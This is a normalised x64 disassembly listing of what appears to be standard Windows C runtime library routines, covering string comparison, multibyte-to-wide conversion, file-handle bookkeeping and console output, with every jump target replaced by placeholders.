sub eax ebx
inc rbx
mov [ rsp + 0x48 ] eax
test r11d r13d
je r-xdata
mov rax [ r15 ]
add r15 0x8
test rax rax
je r-xdata
cmp eax 0x61
je r-xdata
test esi esi
js r-xdata
mov r8 [ rsp + 0x70 ]
lea r9 [ rsp + 0x40 ]
lea rcx [ rbp + 0x1c0 ]
call sub_18002f5e4
xor r10d r10d
test edi edi
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
mov eax 0x27
jmp r-xdata
mov ecx edi
dec edi
test ecx ecx
jg r-xdata
test eax eax
je r-xdata
mov rbx [ rw-data ]
mov rcx rbx
call sub_180023ce0
jmp r-xdata
mov rbx [ rax + 0x8 ]
test rbx rbx
je r-xdata
cmp eax 0x63
je r-xdata
movzx r9d [ rsi ]
lea rdx [ rbp + 0x1c0 ]
lea rcx [ rbp - 0x58 ]
mov r8d 0x6
dec edi
add rsi 0x2
call sub_18002f534
xor r10d r10d
test eax eax
jne r-xdata
jmp r-xdata
dec eax
cmp [ rcx ] r10b
je r-xdata
sub ecx ebx
dec eax
cmp [ rcx ] r10w
je r-xdata
sub rcx rbx
sar rcx 0x1
jmp r-xdata
mov [ rsp + 0x64 ] eax
mov r9d 0x10
test r13b r13b
jns r-xdata
dec rbx
inc [ rsp + 0x48 ]
mov [ rbx ] 0x30
jmp r-xdata
cmp [ rbx ] 0x30
je r-xdata
xor r10d r10d
movsx eax [ rax ]
bt r13d 0xb
jae r-xdata
jmp r-xdata
mov esi [ rsp + 0x40 ]
inc rcx
add rcx 0x2
mov [ rsp + 0x48 ] ecx
jmp r-xdata
mov [ rsp + 0x54 ] r10d
jmp r-xdata
cdq
mov [ rsp + 0x54 ] 0x1
sub eax edx
sar eax 0x1
jmp r-xdata
mov [ rsp + 0x48 ] eax
sub_180030138
mov r9 rcx
xor r8d r8d
mov al [ rcx ]
inc rcx
test al al
jne r-xdata
dec rcx
cmp rcx r9
je r-xdata
cmp [ rcx ] dl
cmove r8 rcx
mov rax r8
retn
cmp [ rcx ] dl
jne r-xdata
sub_180030160
mov [ rsp + 0x10 ] rdi
mov [ rsp + 0x20 ] r12
push rbp
mov rbp rsp
sub rsp 0x70
movsxd rdi ecx
lea rcx [ rbp - 0x20 ]
call sub_1800221bc
cmp edi 0x100
jae r-xdata
mov rax [ rbp - 0x20 ]
cmp [ rax + 0x10c ] 0x1
jle r-xdata
mov rdx [ rbp - 0x20 ]
cmp [ rdx + 0x10c ] 0x1
jle r-xdata
call sub_180022de4
mov edx 0x1
mov [ rax ] 0x2a
mov [ rbp + 0x10 ] dil
mov [ rbp + 0x11 ] 0x0
mov r12d edi
lea rdx [ rbp - 0x20 ]
sar r12d 0x8
movzx ecx r12b
call sub_18002f2c8
test eax eax
je r-xdata
mov rax [ rdx + 0x140 ]
movzx eax [ rax + rdi * 2 ]
and eax 0x1
lea r8 [ rbp - 0x20 ]
mov edx 0x1
mov ecx edi
call sub_18002b270
mov rdx [ rbp - 0x20 ]
jmp r-xdata
cmp [ rbp - 0x8 ] 0x0
je r-xdata
cmp eax 0x1
movzx eax [ rbp + 0x20 ]
je r-xdata
mov [ rbp + 0x10 ] r12b
mov [ rbp + 0x11 ] dil
mov [ rbp + 0x12 ] 0x0
mov edx 0x2
jmp r-xdata
mov rax [ rdx + 0x148 ]
movzx eax [ rax + rdi ]
jmp r-xdata
test eax eax
je r-xdata
mov eax edi
jmp r-xdata
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
cmp [ rbp - 0x8 ] 0x0
je r-xdata
movzx ecx [ rbp + 0x21 ]
shl eax 0x8
or eax ecx
mov rcx [ rbp - 0x20 ]
mov [ rsp + 0x40 ] 0x1
lea r9 [ rbp + 0x10 ]
mov eax [ rcx + 0x4 ]
mov r8d 0x100
mov [ rsp + 0x38 ] eax
lea rax [ rbp + 0x20 ]
mov [ rsp + 0x30 ] 0x3
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] edx
mov edx [ rcx + 0x14 ]
lea rcx [ rbp - 0x20 ]
call sub_18002252c
test eax eax
je r-xdata
lea r11 [ rsp + 0x70 ]
mov rdi [ r11 + 0x18 ]
mov r12 [ r11 + 0x28 ]
mov rsp r11
pop rbp
retn
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_1800302d0
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x20 ] rdi
push rbp
mov rbp rsp
sub rsp 0x80
mov rax [ rw-data ]
xor rax rsp
mov [ rbp - 0x8 ] rax
mov rdi rcx
mov rbx rdx
lea rcx [ rbp - 0x40 ]
mov rdx r8
call sub_1800221bc
lea r11 [ rbp - 0x40 ]
lea rdx [ rbp - 0x20 ]
mov [ rsp + 0x38 ] r11
and [ rsp + 0x30 ] 0x0
and [ rsp + 0x28 ] 0x0
and [ rsp + 0x20 ] 0x0
lea rcx [ rbp - 0x18 ]
xor r9d r9d
mov r8 rbx
call sub_180032128
lea rcx [ rbp - 0x18 ]
mov rdx rdi
mov ebx eax
call sub_180031590
mov edx 0x3
test dl bl
jne r-xdata
test bl 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ rbp - 0x28 ] 0x0
je r-xdata
test bl 0x2
je r-xdata
cmp eax 0x2
jne r-xdata
cmp [ rbp - 0x28 ] 0x0
je r-xdata
mov eax 0x4
jmp r-xdata
mov rax [ rbp - 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
cmp [ rbp - 0x28 ] 0x0
je r-xdata
cmp [ rbp - 0x28 ] 0x0
je r-xdata
mov eax edx
jmp r-xdata
mov rcx [ rbp - 0x30 ]
and [ rcx + 0xc8 ] 0xfffffffd
mov rcx [ rbp - 0x8 ]
xor rcx rsp
call sub_1800212e0
lea r11 [ rsp + 0x80 ]
mov rbx [ r11 + 0x20 ]
mov rdi [ r11 + 0x28 ]
mov rsp r11
pop rbp
retn
xor eax eax
mov rax [ rbp - 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
mov rax [ rbp - 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
jmp r-xdata
sub_1800303d0
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x20 ] rdi
push rbp
mov rbp rsp
sub rsp 0x80
mov rax [ rw-data ]
xor rax rsp
mov [ rbp - 0x8 ] rax
mov rdi rcx
mov rbx rdx
lea rcx [ rbp - 0x40 ]
mov rdx r8
call sub_1800221bc
lea r11 [ rbp - 0x40 ]
lea rdx [ rbp - 0x20 ]
mov [ rsp + 0x38 ] r11
and [ rsp + 0x30 ] 0x0
and [ rsp + 0x28 ] 0x0
and [ rsp + 0x20 ] 0x0
lea rcx [ rbp - 0x18 ]
xor r9d r9d
mov r8 rbx
call sub_180032128
lea rcx [ rbp - 0x18 ]
mov rdx rdi
mov ebx eax
call sub_180031b5c
mov edx 0x3
test dl bl
jne r-xdata
test bl 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ rbp - 0x28 ] 0x0
je r-xdata
test bl 0x2
je r-xdata
cmp eax 0x2
jne r-xdata
cmp [ rbp - 0x28 ] 0x0
je r-xdata
mov eax 0x4
jmp r-xdata
mov rax [ rbp - 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
cmp [ rbp - 0x28 ] 0x0
je r-xdata
cmp [ rbp - 0x28 ] 0x0
je r-xdata
mov eax edx
jmp r-xdata
mov rcx [ rbp - 0x30 ]
and [ rcx + 0xc8 ] 0xfffffffd
mov rcx [ rbp - 0x8 ]
xor rcx rsp
call sub_1800212e0
lea r11 [ rsp + 0x80 ]
mov rbx [ r11 + 0x20 ]
mov rdi [ r11 + 0x28 ]
mov rsp r11
pop rbp
retn
xor eax eax
mov rax [ rbp - 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
mov rax [ rbp - 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
jmp r-xdata
sub_1800304d0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov r10 [ r9 + 0x10 ]
xor r11d r11d
mov rbx rcx
test rcx rcx
jne r-xdata
test rdx rdx
je r-xdata
call sub_180022de4
mov ebx 0x16
mov eax r11d
test r8d r8d
mov [ rcx ] r11b
cmovg eax r8d
inc eax
cdqe
cmp rdx rax
ja r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov [ rcx ] 0x30
lea rax [ rcx + 0x1 ]
jmp r-xdata
call sub_180022de4
mov ebx 0x22
jmp r-xdata
test r8d r8d
jg r-xdata
mov [ rax ] ebx
call sub_180026534
mov eax ebx
jmp r-xdata
cmp [ r10 ] r11b
je r-xdata
mov [ rax ] r11b
js r-xdata
mov ecx 0x30
movsx ecx [ r10 ]
inc r10
jmp r-xdata
cmp [ rbx ] 0x31
jne r-xdata
cmp [ r10 ] 0x35
jl r-xdata
mov [ rax ] cl
inc rax
dec r8d
lea rcx [ rbx + 0x1 ]
call sub_180023ce0
lea rdx [ rbx + 0x1 ]
mov rcx rbx
lea r8 [ rax + 0x1 ]
call sub_1800205e0
inc [ r9 + 0x4 ]
jmp r-xdata
jmp r-xdata
xor eax eax
dec rax
cmp [ rax ] 0x39
je r-xdata
mov [ rax ] 0x30
inc [ rax ]
sub_18003059c
mov [ rsp + 0x8 ] rbx
movzx r11d [ rdx + 0x6 ]
mov r9 rcx
mov ecx [ rdx + 0x4 ]
movzx r8d r11w
mov eax 0x8000
mov r10d 0x7ff
shr r8w 0x4
and r11w ax
mov eax [ rdx ]
and r8w r10w
and ecx 0xfffff
mov ebx 0x80000000
movzx edx r8w
test edx edx
je r-xdata
test ecx ecx
jne r-xdata
cmp edx r10d
je r-xdata
mov edx 0x3c01
add r8w dx
xor ebx ebx
test eax eax
jne r-xdata
mov r8d 0x7fff
jmp r-xdata
mov edx 0x3c00
add r8w dx
jmp r-xdata
mov [ r9 + 0x4 ] r10d
test r10d r10d
jns r-xdata
and [ r9 + 0x4 ] eax
and [ r9 ] eax
jmp r-xdata
mov r10d eax
shl ecx 0xb
shr r10d 0x15
or r10d ecx
or r10d ebx
shl eax 0xb
mov [ r9 ] eax
jmp r-xdata
mov edx [ r9 ]
lea eax [ r10 + r10 ]
mov ecx edx
shr ecx 0x1f
mov r10d ecx
or r10d eax
lea eax [ rdx + rdx ]
mov [ r9 ] eax
mov eax 0xffff
add r8w ax
or r11w r8w
mov rbx [ rsp + 0x8 ]
mov [ r9 + 0x8 ] r11w
retn
sub_180030664
push rbp
push rbx
push rsi
push rdi
lea rbp [ rsp - 0x3f ]
sub rsp 0x88
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x27 ] rax
mov rdi rdx
mov [ rbp - 0x19 ] rcx
lea rdx [ rbp - 0x19 ]
lea rcx [ rbp - 0x9 ]
mov rbx r9
mov rsi r8
call sub_18003059c
mov rax [ rbp - 0x9 ]
xor r8d r8d
mov [ rbp - 0x19 ] rax
movzx eax [ rbp - 0x1 ]
lea r9 [ rbp + 0x7 ]
lea edx [ r8 + 0x11 ]
lea rcx [ rbp - 0x19 ]
mov [ rbp - 0x11 ] ax
call sub_18003298c
movsx ecx [ rbp + 0x9 ]
lea r8 [ rbp + 0xb ]
mov [ rdi ] ecx
movsx ecx [ rbp + 0x7 ]
mov rdx rbx
mov [ rdi + 0x4 ] ecx
mov rcx rsi
mov [ rdi + 0x8 ] eax
call sub_180025324
test eax eax
jne r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180026490
int3
mov [ rdi + 0x10 ] rsi
mov rax rdi
mov rcx [ rbp + 0x27 ]
xor rcx rsp
call sub_1800212e0
add rsp 0x88
pop rdi
pop rsi
pop rbx
pop rbp
retn
sub_180030728
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x20 ] rbp
push rsi
push rdi
push r12
sub rsp 0x40
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x30 ] rax
test [ rdx + 0x18 ] 0x40
mov rdi rdx
movzx esi cx
jne r-xdata
movsxd rax [ rdi + 0x8 ]
add rax 0xfffffffffffffffe
mov [ rdi + 0x8 ] eax
test eax eax
js r-xdata
mov rcx rdx
call sub_18002f2a0
lea rbp [ rw-data ]
lea r12 [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov rdx rdi
movzx ecx si
call sub_180033440
mov rax [ rdi ]
mov [ rax ] si
mov r11 rbp
mov rcx rdi
call sub_18002f2a0
cmp eax 0xfffffffe
je r-xdata
mov rcx [ rsp + 0x30 ]
xor rcx rsp
call sub_1800212e0
mov rbx [ rsp + 0x70 ]
mov rbp [ rsp + 0x78 ]
add rsp 0x40
pop r12
pop rdi
pop rsi
retn
movsxd rcx [ rdi + 0x8 ]
add rcx 0xfffffffffffffffe
mov [ rdi + 0x8 ] ecx
test ecx ecx
js r-xdata
mov rcx rdi
call sub_18002f2a0
cmp eax 0xffffffff
je r-xdata
mov rcx rdi
call sub_18002f2a0
mov rcx rdi
movsxd rbx eax
sar rbx 0x5
call sub_18002f2a0
mov r11d eax
and r11d 0x1f
imul r11 r11 0x58
add r11 [ r12 + rbx * 8 ]
jmp r-xdata
mov rcx [ rdi ]
mov [ rcx ] si
jmp r-xdata
mov r11 rbp
mov rcx rdi
call sub_18002f2a0
cmp eax 0xfffffffe
je r-xdata
mov al [ r11 + 0x38 ]
and al 0x7f
cmp al 0x2
je r-xdata
add [ rdi ] 0x2
movzx eax si
jmp r-xdata
mov rcx rdi
call sub_18002f2a0
cmp eax 0xffffffff
je r-xdata
mov rcx rdi
call sub_18002f2a0
mov rcx rdi
movsxd rbx eax
sar rbx 0x5
call sub_18002f2a0
mov r11d eax
and r11d 0x1f
imul r11 r11 0x58
add r11 [ r12 + rbx * 8 ]
jmp r-xdata
test [ rbp + 0x8 ] 0x80
je r-xdata
mov rcx rdi
call sub_18002f2a0
cmp eax 0xfffffffe
je r-xdata
mov al [ r11 + 0x38 ]
and al 0x7f
cmp al 0x1
je r-xdata
lea rdx [ rsp + 0x24 ]
lea rcx [ rsp + 0x20 ]
movzx r9d si
mov r8d 0x5
call sub_18002f534
xor ebx ebx
test eax eax
je r-xdata
mov rcx rdi
call sub_18002f2a0
mov rcx rdi
movsxd rbx eax
sar rbx 0x5
call sub_18002f2a0
mov ebp eax
and ebp 0x1f
imul rbp rbp 0x58
add rbp [ r12 + rbx * 8 ]
cmp [ rsp + 0x20 ] ebx
jle r-xdata
mov eax 0xffff
jmp r-xdata
movzx eax si
jmp r-xdata
lea rbp [ rsp + 0x24 ]
movsx ecx [ rbp ]
mov rdx rdi
call sub_180026c74
mov ecx eax
mov rcx [ rdi ]
mov al [ rbp ]
mov [ rcx ] al
mov rax [ rdi ]
movzx ecx [ rax ]
inc rax
mov [ rdi ] rax
jmp r-xdata
inc ebx
inc rbp
cmp ebx [ rsp + 0x20 ]
jl r-xdata
cmp ecx 0xffffffff
je r-xdata
dec [ rdi + 0x8 ]
js r-xdata
sub_180030928
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rsi
mov [ rax + 0x18 ] rdi
mov [ rax + 0x20 ] r12
push rbp
mov rbp rsp
sub rsp 0x50
xor r12d r12d
mov rsi r8
mov rdi rdx
mov rbx rcx
test rdx rdx
je r-xdata
xor eax eax
test r8 r8
je r-xdata
cmp [ rdx ] r12b
jne r-xdata
lea rcx [ rbp - 0x20 ]
mov rdx r9
call sub_1800221bc
mov r11 [ rbp - 0x20 ]
cmp [ r11 + 0x14 ] r12d
jne r-xdata
test rcx rcx
je r-xdata
movzx ecx [ rdi ]
lea rdx [ rbp - 0x20 ]
call sub_18002f2c8
test eax eax
je r-xdata
test rbx rbx
je r-xdata
mov [ rcx ] r12w
mov eax r12d
mov r9d 0x1
test rbx rbx
setne al
lea edx [ r9 + 0x8 ]
mov r8 rdi
mov [ rsp + 0x28 ] eax
mov rax [ rbp - 0x20 ]
mov [ rsp + 0x20 ] rbx
mov ecx [ rax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov rcx [ rbp - 0x20 ]
mov r9d [ rcx + 0x10c ]
cmp r9d 0x1
jle r-xdata
cmp [ rbp - 0x8 ] r12b
je r-xdata
movzx eax [ rdi ]
mov [ rbx ] ax
jmp r-xdata
movsxd rax [ rcx + 0x10c ]
cmp rsi rax
jb r-xdata
cmp esi r9d
jl r-xdata
mov eax 0x1
jmp r-xdata
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
call sub_180022de4
mov [ rax ] 0x2a
cmp [ rbp - 0x8 ] r12b
je r-xdata
cmp [ rdi + 0x1 ] r12b
je r-xdata
mov ecx [ rcx + 0x4 ]
mov eax r12d
test rbx rbx
setne al
mov r8 rdi
mov edx 0x9
mov [ rsp + 0x28 ] eax
mov [ rsp + 0x20 ] rbx
call [ MultiByteToWideChar@IAT ]
mov rcx [ rbp - 0x20 ]
test eax eax
jne r-xdata
mov rbx [ rsp + 0x60 ]
mov rsi [ rsp + 0x68 ]
mov rdi [ rsp + 0x70 ]
mov r12 [ rsp + 0x78 ]
add rsp 0x50
pop rbp
retn
or eax 0xffffffff
jmp r-xdata
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
mov eax [ rcx + 0x10c ]
cmp [ rbp - 0x8 ] r12b
je r-xdata
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
jmp r-xdata
sub_180030aa8
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x40
mov ebx edx
mov rdx rcx
lea rcx [ rsp + 0x20 ]
mov edi r9d
mov esi r8d
call sub_1800221bc
mov rax [ rsp + 0x28 ]
movzx r11d bl
test [ r11 + rax + 0x1d ] dil
jne r-xdata
mov eax 0x1
test esi esi
je r-xdata
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
add rsp 0x40
pop rdi
retn
mov rcx [ rsp + 0x30 ]
and [ rcx + 0xc8 ] 0xfffffffd
xor eax eax
mov rax [ rsp + 0x20 ]
mov rcx [ rax + 0x140 ]
movzx eax [ rcx + r11 * 2 ]
and eax esi
jmp r-xdata
cmp [ rsp + 0x38 ] 0x0
je r-xdata
test eax eax
je r-xdata
sub_180030b38
mov r9 rcx
movzx ecx [ rdx ]
inc rdx
lea eax [ rcx - 0x41 ]
cmp eax 0x19
ja r-xdata
add r8d 0x20
test r8d r8d
je r-xdata
add ecx 0x20
sub r8d ecx
mov eax r8d
retn
cmp r8d ecx
je r-xdata
movzx r8d [ r9 ]
inc r9
lea eax [ r8 - 0x41 ]
cmp eax 0x19
ja r-xdata
sub_180030b74
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push rbp
mov rbp rsp
sub rsp 0x40
mov rsi rcx
mov rdi rdx
lea rcx [ rbp - 0x20 ]
mov rdx r8
call sub_1800221bc
test rsi rsi
jne r-xdata
test rdi rdi
je r-xdata
call sub_180022de4
mov [ rax ] 0x16
call sub_180026534
cmp [ rbp - 0x8 ] 0x0
je r-xdata
mov rax [ rbp - 0x20 ]
cmp [ rax + 0x14 ] 0x0
jne r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
sub rsi rdi
mov rdx rdi
mov rcx rsi
call sub_180030b38
cmp [ rbp - 0x8 ] 0x0
je r-xdata
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
mov rdi [ rsp + 0x60 ]
add rsp 0x40
pop rbp
retn
sub ebx eax
cmp [ rbp - 0x8 ] 0x0
je r-xdata
cmp ebx eax
je r-xdata
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
jmp r-xdata
mov eax ebx
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
movzx ecx [ rsi + rdi ]
lea rdx [ rbp - 0x20 ]
call sub_180030160
movzx ecx [ rdi ]
lea rdx [ rbp - 0x20 ]
mov ebx eax
call sub_180030160
inc rdi
test ebx ebx
je r-xdata
sub_180030c4c
sub rsp 0x28
cmp [ rw-data ] 0x0
jne r-xdata
xor r8d r8d
add rsp 0x28
jmp sub_180030b74
test rcx rcx
jne r-xdata
test rdx rdx
je r-xdata
call sub_180022de4
mov [ rax ] 0x16
call sub_180026534
mov eax 0x7fffffff
add rsp 0x28
retn
add rsp 0x28
jmp sub_180030b38
sub_180030ca0
mov r10 rcx
test r8 r8
je r-xdata
xor eax eax
retn
movzx r9d [ r10 ]
inc r10
lea eax [ r9 - 0x41 ]
cmp eax 0x19
ja r-xdata
movzx ecx [ rdx ]
inc rdx
lea eax [ rcx - 0x41 ]
cmp eax 0x19
ja r-xdata
add r9d 0x20
dec r8
je r-xdata
add ecx 0x20
sub r9d ecx
mov eax r9d
retn
test r9d r9d
je r-xdata
cmp r9d ecx
je r-xdata
sub_180030ce8
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rsi
mov [ rax + 0x18 ] rdi
mov [ rax + 0x20 ] r12
push rbp
mov rbp rsp
sub rsp 0x40
mov r12 r8
mov rsi rdx
mov rdi rcx
test r8 r8
je r-xdata
xor eax eax
lea rcx [ rbp - 0x20 ]
mov rdx r9
call sub_1800221bc
test rdi rdi
jne r-xdata
test rsi rsi
je r-xdata
call sub_180022de4
mov [ rax ] 0x16
call sub_180026534
cmp [ rbp - 0x8 ] 0x0
je r-xdata
cmp r12 0x7fffffff
ja r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
mov rax [ rbp - 0x20 ]
cmp [ rax + 0x14 ] 0x0
jne r-xdata
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
mov rdi [ rsp + 0x60 ]
mov r12 [ rsp + 0x68 ]
add rsp 0x40
pop rbp
retn
sub rdi rsi
mov r8 r12
mov rdx rsi
mov rcx rdi
call sub_180030ca0
cmp [ rbp - 0x8 ] 0x0
je r-xdata
sub ebx eax
cmp [ rbp - 0x8 ] 0x0
je r-xdata
test ebx ebx
je r-xdata
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
jmp r-xdata
mov eax ebx
jmp r-xdata
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
cmp ebx eax
je r-xdata
movzx ecx [ rdi + rsi ]
lea rdx [ rbp - 0x20 ]
call sub_180030160
movzx ecx [ rsi ]
lea rdx [ rbp - 0x20 ]
mov ebx eax
call sub_180030160
inc rsi
dec r12
je r-xdata
sub_180030dec
sub rsp 0x28
cmp [ rw-data ] 0x0
jne r-xdata
xor r9d r9d
add rsp 0x28
jmp sub_180030ce8
test rcx rcx
jne r-xdata
test rdx rdx
je r-xdata
call sub_180022de4
mov [ rax ] 0x16
call sub_180026534
mov eax 0x7fffffff
add rsp 0x28
retn
cmp r8 0x7fffffff
ja r-xdata
add rsp 0x28
jmp sub_180030ca0
sub_180030e3c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
push rdi
sub rsp 0x20
test ecx ecx
js r-xdata
call sub_180022de4
mov [ rax ] 0x9
call sub_180022e04
and [ rax ] 0x0
or eax 0xffffffff
cmp ecx [ rw-data ]
jae r-xdata
movsxd rbx ecx
lea rbp [ rw-data ]
mov rdi rbx
and ebx 0x1f
sar rdi 0x5
imul rbx rbx 0x58
mov rax [ rbp + rdi * 8 ]
test [ rax + rbx + 0x8 ] 0x1
je r-xdata
cmp [ rax + rbx ] 0xffffffffffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov rax [ rbp + rdi * 8 ]
or [ rbx + rax ] 0xffffffffffffffff
xor eax eax
jmp r-xdata
test ecx ecx
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov ecx 0xfffffff6
dec ecx
je r-xdata
mov ecx 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
xor edx edx
call [ SetStdHandle@IAT ]
mov ecx 0xfffffff4
jmp r-xdata
sub_180030ee8
sub rsp 0x28
cmp ecx 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_180022e04
and [ rax ] 0x0
call sub_180022de4
mov [ rax ] 0x9
jmp r-xdata
call sub_180022e04
and [ rax ] 0x0
call sub_180022de4
mov [ rax ] 0x9
call sub_180026534
cmp ecx [ rw-data ]
jae r-xdata
or rax 0xffffffffffffffff
movsxd rdx ecx
lea rcx [ rw-data ]
mov rax rdx
and edx 0x1f
sar rax 0x5
imul rdx rdx 0x58
mov rax [ rcx + rax * 8 ]
test [ rax + rdx + 0x8 ] 0x1
je r-xdata
mov rax [ rax + rdx ]
jmp r-xdata
add rsp 0x28
retn
sub_180030f5c
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rsi
mov [ rax + 0x18 ] rdi
mov [ rax + 0x20 ] r12
push r14
sub rsp 0x20
movsxd rbx ecx
mov r12 rbx
sar r12 0x5
lea r14 [ rw-data ]
and ebx 0x1f
imul rbx rbx 0x58
mov rsi [ r14 + r12 * 8 ]
mov edi 0x1
cmp [ rbx + rsi + 0xc ] 0x0
jne r-xdata
test edi edi
je r-xdata
lea ecx [ rdi + 0x9 ]
call sub_18002d0a8
nop
cmp [ rbx + rsi + 0xc ] 0x0
jne r-xdata
mov eax edi
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
mov rdi [ rsp + 0x40 ]
mov r12 [ rsp + 0x48 ]
add rsp 0x20
pop r14
retn
mov rcx [ r14 + r12 * 8 ]
lea rcx [ rcx + rbx + 0x10 ]
call [ EnterCriticalSection@IAT ]
mov ecx 0xa
call sub_18002cfa8
lea rcx [ rbx + rsi + 0x10 ]
mov edx 0xfa0
call [ InitializeCriticalSectionAndSpinCount@IAT ]
neg eax
sbb edx edx
and edi edx
inc [ rbx + rsi + 0xc ]
sub_18003102c
mov [ rsp + 0x8 ] cx
sub rsp 0x38
mov rcx [ rw-data ]
cmp rcx 0xfffffffffffffffe
jne r-xdata
cmp rcx 0xffffffffffffffff
jne r-xdata
call sub_1800335d0
mov rcx [ rw-data ]
and [ rsp + 0x20 ] 0x0
lea r9 [ rsp + 0x48 ]
lea rdx [ rsp + 0x40 ]
mov r8d 0x1
call [ WriteConsoleW@IAT ]
test eax eax
je r-xdata
mov eax 0xffff
jmp r-xdata
movzx eax [ rsp + 0x40 ]
add rsp 0x38
retn
sub_180031088
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x30
xor edi edi
lea ecx [ rdi + 0x1 ]
call sub_18002d0a8
nop
lea ebx [ rdi + 0x3 ]
mov ecx 0x1
call sub_18002cfa8
mov eax edi
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x30
pop rdi
retn
movsxd rsi ebx
mov rax [ rw-data ]
cmp [ rax + rsi * 8 ] 0x0
je r-xdata
inc ebx
jmp r-xdata
mov rcx [ rax + rsi * 8 ]
test [ rcx + 0x18 ] 0x83
je r-xdata
mov [ rsp + 0x20 ] ebx
cmp ebx [ rw-data ]
jge r-xdata
cmp ebx 0x14
jl r-xdata
call sub_1800336ac
cmp eax 0xffffffff
je r-xdata
mov rax [ rw-data ]
mov rcx [ rax + rsi * 8 ]
add rcx 0x30
call [ DeleteCriticalSection@IAT ]
mov rcx [ rw-data ]
mov rcx [ rcx + rsi * 8 ]
call sub_18002094c
mov r11 [ rw-data ]
and [ r11 + rsi * 8 ] 0x0
inc edi
mov [ rsp + 0x24 ] edi
sub_180031134
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov eax [ rcx + 0x18 ]
xor esi esi
mov rbx rcx
and al 0x3
cmp al 0x2
jne r-xdata
mov rcx [ rbx + 0x10 ]
and [ rbx + 0x8 ] 0x0
mov eax esi
mov rsi [ rsp + 0x38 ]
mov [ rbx ] rcx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
test [ rcx + 0x18 ] 0x108
je r-xdata
mov edi [ rcx ]
sub edi [ rcx + 0x10 ]
test edi edi
jle r-xdata
call sub_18002f2a0
mov rdx [ rbx + 0x10 ]
mov r8d edi
mov ecx eax
call sub_18002eef8
cmp eax edi
jne r-xdata
or [ rbx + 0x18 ] 0x20
or esi 0xffffffff
mov eax [ rbx + 0x18 ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ rbx + 0x18 ] eax
jmp r-xdata
sub_1800311b0
push rbx
sub rsp 0x20
mov rbx rcx
test rcx rcx
jne r-xdata
call sub_180031134
test eax eax
je r-xdata
add rsp 0x20
pop rbx
jmp sub_1800311fc
test [ rbx + 0x18 ] 0x4000
je r-xdata
or eax 0xffffffff
jmp r-xdata
xor eax eax
mov rcx rbx
call sub_18002f2a0
mov ecx eax
call sub_180033714
neg eax
sbb eax eax
jmp r-xdata
add rsp 0x20
pop rbx
retn
sub_1800311fc
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r12
push r13
push r15
sub rsp 0x30
mov r13d ecx
xor esi esi
xor edi edi
lea ecx [ rsi + 0x1 ]
call sub_18002d0a8
nop
xor ebx ebx
or r15d 0xffffffff
mov ecx 0x1
call sub_18002cfa8
cmp r13d 0x1
cmove edi esi
mov eax edi
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
mov rdi [ rsp + 0x60 ]
add rsp 0x30
pop r15
